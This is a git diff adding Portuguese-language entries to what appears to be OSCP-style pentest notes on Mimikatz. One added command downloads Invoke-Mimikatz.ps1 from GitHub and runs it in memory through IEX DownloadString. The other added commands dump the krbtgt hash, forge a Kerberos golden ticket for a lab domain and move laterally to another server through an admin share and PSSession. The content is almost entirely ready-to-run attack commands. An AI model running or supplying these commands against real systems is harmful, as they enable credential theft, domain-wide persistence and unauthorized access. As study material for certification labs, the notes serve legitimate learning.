@@ -1236,9 +1236,25 @@ curl https://github.com/n0ts0cial/oscp/raw/main/x64/mimikatz.exe -Outfile mimika
 ```
 curl https://github.com/n0ts0cial/oscp/raw/main/Invoke-Mimikatz.ps1 -Outfile Invoke-Mimikatz.ps1
 Import-Module .\Invoke-Mimikatz.ps1
+Invoke-Mimikatz
 ```
 ```
 IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/Invoke-Mimikatz.ps1")
+Invoke-Mimikatz
+```
+##### GOLDEN TICKET MIMIKATZ - PEGAR O HASH DE KRBTGT (COMO ADMIN):
+```
+privilege::debug
+lsadump::lsa /patch
+```
+##### GOLDEN TICKET MIMIKATZ - GERAR TICKET P QQ USUARIO EM QQ MAQUINA:
+```
+kerberos::golden /User:vegeta /domain:tech.local /sid:S-1-5-21-4215187987-3124207031-433979976 /krbtgt:28ec87e3414d019c944786bf447fd666 id:500 /groups:512 /startoffset:0 /ending:600 /renewmax:10080 /ptt
+```
+TENTAR SE CONECTAR EM OUTRO SERVIDOR (NAO CONECTOU NO DC):
+```
+dir \\server01\c$
+enter-pssession -computername server01
 ```
 
 
